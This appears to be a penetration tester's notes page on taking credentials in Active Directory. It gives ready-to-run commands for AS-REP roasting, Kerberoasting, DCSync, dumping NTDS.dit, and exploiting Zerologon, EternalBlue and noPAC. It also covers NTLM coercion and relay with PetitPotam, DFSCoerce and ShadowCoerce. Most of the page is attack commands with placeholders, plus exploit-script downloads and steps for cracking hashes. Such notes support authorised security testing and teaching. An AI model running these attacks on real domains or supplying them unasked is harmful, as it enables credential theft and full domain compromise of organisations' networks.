+++
title = "AD: Getting Access Credentials"
+++

# Getting Access Credentials

## ASREPROASTING (cracking TGT)

When Kerberos pre-authentication is disabled, an attacker can request encrypted authentication responses without needing the user's password and later attempt offline password cracking.

### Windows

```powershell
# Enumerate Vulnerable Users (PowerView)
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Roast Specific User (Rubeus)
.\Rubeus.exe asreproast /nowrap /format:hashcat /user:<USERNAME>
```

### Linux

{{< embed-section page="Docs/9 - Notes/netexec" header="asreproast" >}}

```bash
# Linux Alternative (Kerbrute)
sudo wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /sbin/kerbrute && sudo chmod +x /sbin/kerbrute

# Brute-force users AND auto-check for AS-REP Roasting
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>
```

## KERBEROASTING (cracking TGS)

- Service Principal Names (SPN): https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names
- Event 4769 Logging: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769
- Event 4770 Logging: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4770
- Mitigation: https://adsecurity.org/?p=3458

Kerberoasting involves any valid domain user requesting a Ticket Granting Service (TGS) for an SPN. The TGS is encrypted with the service's NTLM password hash, which if a human-readable password was set, can be cracked to reveal a password. The service is often times a local administrator. The key point is this technique **must use password cracking to reveal the password; otherwise, only the TGS and an authorized user can access the service** . Hence, an uncrackable password will prove fruitless.
One must have 1 of the following:
- an account's cleartext password or NTLM hash
- a shell in the context of a domain user account (Kerberos ticket)
- SYSTEM level access on a domain-joined host

### TGS Encryption Types

- Kerberos Encryption Types: https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797

| Encryption Type | Hashcat Mode | Hash Format     | Notes                                                       |
| :-------------- | :----------- | :-------------- | :---------------------------------------------------------- |
| **RC4**         | `13100`      | `$krb5tgs$23$*` | Most common in most environments. Type 23 encrypted ticket. |
| **AES-128**     | `19600`      | `$krb5tgs$17$*` | Type 17 encrypted ticket.                                   |
| **AES-256**     | `19700`      | `$krb5tgs$18$*` | Sometimes received. Type 18 encrypted ticket.               |

#### Create Fake SPN via PowerView

Create a fake SPN to Kerberoast a user. This will require proper enumeration and a vector to have the right privileges.

`SPN_NAME` format: `serviceclass/host[:port]`: e.g. `MSSQLSvc/sql01.domain.local:1433`

**First import PowerView:**

{{< embed-section page="Docs/6 - Post-Exploitation/nice-commands" header="via-powerview" >}}

```powershell
# Authenticate
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$CredSPN = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)

# Create SPN
Set-DomainObject -Credential $CredSPN -Identity <USER> -SET @{serviceprincipalname='<SPN_NAME>'} -Verbose
```

##### Cleanup

```powershell
# Remove fake SPN
Set-DomainObject -Credential $CredSPN -Identity <USER> -Clear <SPN_NAME> -Verbose
```

### `targetedKerberos.py`

Abuses `GenericAll`/`GenericWrite`/`WriteProperty` ACL edges. It temporarily sets an SPN on an account that doesn't have one, roasts it, then removes the SPN.

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git && cd targetedKerberoast

python3 targetedKerberoast.py -o targetedKerberoast_hashes.txt -u <USER> -p '<PASS>' -d <DOMAIN> --dc-ip <DC_IP>
```

### Linux

{{< embed-section page="Docs/9 - Notes/netexec" header="kerberoast" >}}

#### Impacket GetUserSPNs

```bash
# Enum users and collect tickets
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASSWORD>' -request -outputfile kerberoast_tickets.txt
```

#### Crack TGS

```bash
# Crack TGS
hashcat -m 13100 kerberoast_tickets.txt <WORDLIST>

# Verify via netexec
netexec smb <DC_IP> -u <USER> -p <PASSWORD>
```

### Windows

- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)

#### via Rubeus

```bash
# Show Kerberoastable users
.\Rubeus.exe kerberoast /nowrap

# Show Kerberoastable admins
.\Rubeus.exe kerberoast /nowrap /ldapfilter:'admincount=1'

# Kerberoast User
# NOTE: /tgtdeleg attempts to force RC4 enc
.\Rubeus.exe kerberoast /nowrap /tgtdeleg /user:<USER>
```

**NOTE:** This RC4 downgrade does not work against a Windows Server 2019 Domain Controller. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. `/tgtdeleg` is a client-side negotiation hint only — it cannot override DC or account policy. The SPN account's `msDS-SupportedEncryptionTypes` attribute must include RC4 (flag value `0x4`) for the DC to issue an RC4-encrypted ticket; if the account or domain policy excludes RC4, the DC will issue AES regardless of what the client requests.#### via PowerView

```bash
# Enumerate SPN Accounts
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname,description
```

```bash
# Get TGS for User
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

```bash
# Get ALL TGS
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation .\<OUTFILE>
```

#### via Manual Method

```bash
# REQUIRED: declare new type
Add-Type -AssemblyName System.IdentityModel

# Request and load all TGS for all SPNs into memory
# NOTE: these will need to be dumped from memory
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Dump TGS from memory
.\mimikatz.exe
base64 /out:true
kerberos::list /export

# Format Base64 TGS
echo '<TGS_BASE64>' | tr -d \\n | base64 -d > vmware.kirbi
kirbi2john vmware.kirbi > crackme.txt

# CRACK!
```

**See cracking:** [Crack TGS](#crack-tgs)

## DCSync

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync

Steals the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data, allowing an attacker to mimic a DC to retrieve user NTLM password hashes.

- REQUIRES: `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All` Permission
    - or `Write-Dacl` to add perm: https://bloodhound.specterops.io/resources/edges/write-dacl

### Enum via PowerView

```powershell
# Look for DS-Replication-Get-Changes-All
$sid = Convert-NameToSid <USER>
Get-ObjectAcl "DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Attack via netexec

{{< embed-section page="Docs/9 - Notes/netexec" header="ntds-dump" >}}

### Attack via mimikatz

{{< embed-section page="Docs/9 - Notes/mimikatz" header="dcsync" >}}

### Manually via `NTDS.dit`

`netexec` essentially does the same thing here but remotely... so this should be a last resort method.

```bash
# Copy NTDS.dit
# NOTE: hashes in NTDS are encrypted with DPAPI key in SYSTEM
vssadmin list shadows
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Download it and impacket-secretsdump
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```bash
# Same as above but easier
netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

## DC Vulnerability Attacks

Scan first with [nxc DC Vulnerability Scanning]({{% ref "netexec.md#dc-vulnerability-scanning" %}}). Priority order for unpatched environments:

1. **Zerologon** -- no creds, instant game over
2. **EternalBlue** -- no creds, RCE
3. **noPAC** -- one domain user, instant DA
4. Coercion + ADCS -- one domain user, relay to DA via ESC8
5. Coercion + relay -- one domain user, signing must be off somewhere

| Exploit          | Requires                 | Works when                                            |
| ---------------- | ------------------------ | ----------------------------------------------------- |
| **Zerologon**    | Network access, no creds | DC unpatched (pre-Aug 2020)                           |
| **EternalBlue**  | Network access, no creds | Unpatched SMB (pre-March 2017), SMBv1 enabled         |
| **noPAC**        | Valid domain user        | `ms-DS-MachineAccountQuota > 0`, unpatched (Dec 2021) |
| **PetitPotam**   | Network access           | ADCS exists OR SMB signing OFF on relay target        |
| **DFSCoerce**    | Valid domain user        | Same as PetitPotam -- needs relay target              |
| **ShadowCoerce** | Valid domain user        | Same as PetitPotam -- needs relay target              |

### Zerologon (CVE-2020-1472)

Exploits a broken authentication handshake in MS-NRPC to set the DC machine account password to empty, enabling DCSync with no credentials. **Restore the password immediately -- a zeroed machine account breaks DC replication.**

- https://github.com/dirkjanm/CVE-2020-1472

```bash
# Download exploit + restore scripts
wget https://github.com/dirkjanm/CVE-2020-1472/raw/refs/heads/master/cve-2020-1472-exploit.py \
     https://github.com/dirkjanm/CVE-2020-1472/raw/refs/heads/master/restorepassword.py

# Exploit -- zeroes DC$ machine account password
python3 cve-2020-1472-exploit.py <DC_HOSTNAME> <DC_IP>

# DCSync with empty password
nxc smb <DC_IP> -u '<DC_HOSTNAME>$' -p '' --ntds
```

### EternalBlue (MS17-010)

SMBv1 RCE, no credentials required.

```bash
# Detection only -- exploit via Metasploit
nxc smb <DC_IP> -M ms17-010

msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'
```

### NoPac (SAMAccountName Spoofing)

CVE-2021-42278 / CVE-2021-42287. Any domain user can create machine accounts (up to `ms-DS-MachineAccountQuota`, default 10). The attack renames a machine account to match a DC's SAMAccountName, requests a TGT, then renames it back -- the KDC issues a service ticket with DC privileges. Result: full NTDS dump from a regular domain user.

- https://github.com/Ridter/noPac

```bash
git clone https://github.com/Ridter/noPac.git && cd noPac
uv pip install -r requirements.txt

# Dump NTDS as Administrator (-use-vss is more reliable than default method)
uv run python3 noPac.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> \
    --impersonate administrator -dump -use-ldap -use-vss
```

### PetitPotam (NTLM Coercion)

Coerces the DC machine account (DC01$) to authenticate via MS-EFSRPC. The captured NTLMv2 hash is almost always uncrackable -- value is in **relaying** it.

- https://github.com/topotam/PetitPotam

| Condition | Result |
| --- | --- |
| ADCS on network | ✅ relay to certsrv → certificate → TGT → DCSync (see [ESC8]({{% ref "active-directory-adcs.md#adcs-attack-reference" %}})) |
| SMB signing OFF on a target | ✅ relay DC01$ auth → instant access |
| SMB signing ON + no ADCS | ❌ hash captured but uncrackable -- dead end |

```bash
# Download
wget https://raw.githubusercontent.com/topotam/PetitPotam/refs/heads/main/PetitPotam.py

# Start listener -- Responder for hash capture, ntlmrelayx for relay
sudo responder -I <IFACE> -dwv
# or: sudo impacket-ntlmrelayx -tf relay.txt --smb2support
# or: .\Inveigh.exe -LLMNR Y -NBNS Y -Console 5 -FileOutput Y

# Coerce DC authentication toward listener
python3 PetitPotam.py <LISTENER_IP> <DC_IP>
```

### DFSCoerce (NTLM Coercion)

NTLM coercion via MS-DFSNM (Distributed File System Namespace Management). Same relay path as PetitPotam -- useful when PetitPotam is patched.

- https://github.com/Wh04m1001/DFSCoerce

Follow the [PetitPotam relay path](#petitpotam-ntlm-coercion) for exploitation.

```bash
wget https://raw.githubusercontent.com/Wh04m1001/DFSCoerce/refs/heads/main/dfscoerce.py

python3 DFSCoerce.py -u <USER> -p '<PASS>' <LISTENER_IP> <DC_IP>
```

### ShadowCoerce (NTLM Coercion)

- https://github.com/ShutdownRepo/ShadowCoerce

NTLM coercion via MS-FSRVP (File Server VSS Agent Service Protocol). Same relay path as PetitPotam.

Follow the [PetitPotam relay path](#petitpotam-ntlm-coercion) for exploitation.

```bash
wget https://raw.githubusercontent.com/ShutdownRepo/ShadowCoerce/refs/heads/main/shadowcoerce.py

python3 shadowcoerce.py -u <USER> -p '<PASS>' <LISTENER_IP> <DC_IP>
```
